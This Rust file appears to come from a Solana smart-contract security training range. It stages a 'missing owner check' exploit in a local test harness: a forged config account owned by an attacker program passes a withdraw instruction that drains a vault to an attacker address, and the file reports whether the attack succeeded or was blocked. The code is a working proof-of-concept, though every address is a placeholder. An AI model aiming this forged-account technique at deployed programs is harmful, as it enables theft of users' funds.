use solana_address::Address;
use solana_instruction::{AccountMeta, Instruction};
use solana_signer::Signer;
use solana_system_interface::program as system_program;

use crate::{
    Mode,
    artifact::ensure_artifact,
    error::RangeError,
    harness::Harness,
    outcome::{AccountDelta, ExploitOutcome},
};

pub const SLUG: &str = "missing-owner-check";
pub const PROGRAM_ID: Address = Address::new_from_array([0x52; 32]);

const WITHDRAW: u8 = 0;
const AMOUNT: u64 = 4_000_000_000;
const CONFIG_LEN: usize = 32;
const ATTACKER_PROGRAM: Address = Address::new_from_array([0xC2; 32]);

pub fn program_id() -> Address {
    PROGRAM_ID
}

pub fn run(mode: Mode) -> Result<ExploitOutcome, RangeError> {
    let artifact = ensure_artifact(SLUG, mode)?;
    let mut harness = Harness::deploy(PROGRAM_ID, &artifact)?;

    let legit_admin = Harness::keypair(0xA2);
    let attacker = Harness::keypair(0xB2);
    let config = Address::new_from_array([0x62; 32]);
    let forged_config = Address::new_from_array([0x82; 32]);
    let vault = Address::new_from_array([0x72; 32]);
    let destination = Address::new_from_array([0x92; 32]);
    let config_rent = harness.rent_exemption(CONFIG_LEN);

    harness.set_account(
        config,
        config_rent,
        legit_admin.pubkey().to_bytes().to_vec(),
        PROGRAM_ID,
    )?;
    harness.set_account(
        forged_config,
        config_rent,
        attacker.pubkey().to_bytes().to_vec(),
        ATTACKER_PROGRAM,
    )?;
    harness.set_account(vault, AMOUNT, Vec::new(), PROGRAM_ID)?;
    harness.set_account(
        attacker.pubkey(),
        1_000_000_000,
        Vec::new(),
        system_program::ID,
    )?;

    let mut data = Vec::with_capacity(9);
    data.push(WITHDRAW);
    data.extend_from_slice(&AMOUNT.to_le_bytes());

    let instruction = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new_readonly(forged_config, false),
            AccountMeta::new_readonly(attacker.pubkey(), true),
            AccountMeta::new(vault, false),
            AccountMeta::new(destination, false),
        ],
        data,
    };

    let vault_before = harness.lamports(&vault);
    let destination_before = harness.lamports(&destination);
    let result = harness.execute_signed(&[instruction], &[&attacker]);
    let vault_after = harness.lamports(&vault);
    let destination_after = harness.lamports(&destination);

    let changes = vec![
        AccountDelta::new("vault", vault_before, vault_after),
        AccountDelta::new(
            "attacker destination",
            destination_before,
            destination_after,
        ),
    ];

    match result {
        Ok(_) => {
            let expected_destination = destination_before.saturating_add(AMOUNT);
            if vault_after == 0 && destination_after == expected_destination {
                Ok(ExploitOutcome::succeeded(
                    "the program trusted a config account owned by an attacker program",
                    changes,
                )
                .with_note(format!(
                    "forged config {forged_config} is owned by {ATTACKER_PROGRAM}, not the program"
                )))
            } else {
                Err(RangeError::Broken {
                    slug: SLUG,
                    detail: format!(
                        "the withdraw transaction succeeded but state does not match the exploit: \
                         vault {vault_after}, destination {destination_after}"
                    ),
                })
            }
        }
        Err(error) => {
            if vault_after != vault_before || destination_after != destination_before {
                return Err(RangeError::Broken {
                    slug: SLUG,
                    detail: format!(
                        "the rejected withdraw changed state: vault {vault_before} -> {vault_after}, \
                         destination {destination_before} -> {destination_after}"
                    ),
                });
            }
            Ok(ExploitOutcome::blocked(
                "the forged config account was rejected on its owner",
                format!("{error:?}"),
                changes,
            ))
        }
    }
}
